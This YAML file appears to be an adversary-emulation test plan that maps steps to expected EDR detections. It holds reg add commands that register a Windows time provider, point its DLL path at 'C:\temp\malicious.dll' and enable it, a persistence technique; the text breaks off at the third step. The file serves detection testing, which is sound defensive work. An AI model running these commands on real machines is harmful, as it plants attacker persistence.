steps:
- id: step-01
  name: Modify Registry for Time Provider
  command: reg add "HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\{00000000-0000-0000-0000-000000000000}"
    /v "Name" /t REG_SZ /d "CustomTimeProvider" /f
  identity: direct
  mitre_technique: T1547.001
  platforms:
  - windows
  expected_detections:
  - plane: EDR
    type: BIOC
    description: Suspicious Time Provider Registered
    ttp_ref: TTP-0000-0228
    detection_id: bioc-suspicious-time-provider-registered
- id: step-02
  name: Set DLL Path for Time Provider
  command: reg add "HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\{00000000-0000-0000-0000-000000000000}"
    /v "DllName" /t REG_SZ /d "C:\\temp\\malicious.dll" /f
  identity: direct
  mitre_technique: T1547.001
  platforms:
  - windows
  expected_detections:
  - plane: EDR
    type: BIOC
    description: Suspicious Time Provider Registered
    ttp_ref: TTP-0000-0228
    detection_id: bioc-suspicious-time-provider-registered
  causality:
    parent_step: step-01
    pivot: process_lineage
- id: step-03
  name: Enable Time Provider
  command: reg add "HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\{00000000-0000-0000-0000-000000000000}"
    /v "Enabled" /t REG_DWORD /d 1 /f
  identity: direct
  mitre_technique: T1547.001
  platforms:
  - windows
  expected_detections:
